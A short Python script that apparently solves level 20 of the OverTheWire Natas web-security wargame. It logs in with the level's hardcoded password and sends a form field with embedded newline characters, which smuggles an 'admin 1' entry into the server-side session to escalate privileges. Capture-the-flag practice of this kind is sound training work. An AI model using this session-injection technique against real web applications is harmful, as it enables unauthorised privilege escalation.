#!/usr/bin/python
import requests
username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'
def get_flag():
    url = 'http://' + username + '.natas.labs.overthewire.org/?debug=True'
    session = requests.Session()
    obj = { 'name' : '=something"\n\r"admin = 1"' }
    response = session.post(url, data=obj, auth = (username, password))
    i = response.text.find('<div id="content">')
    print(response.text[i+1:])
    if('You are logged in as a regular user' not in response.text):
        print('Username: natas21')
        print(response.text[i+1:])
get_flag()
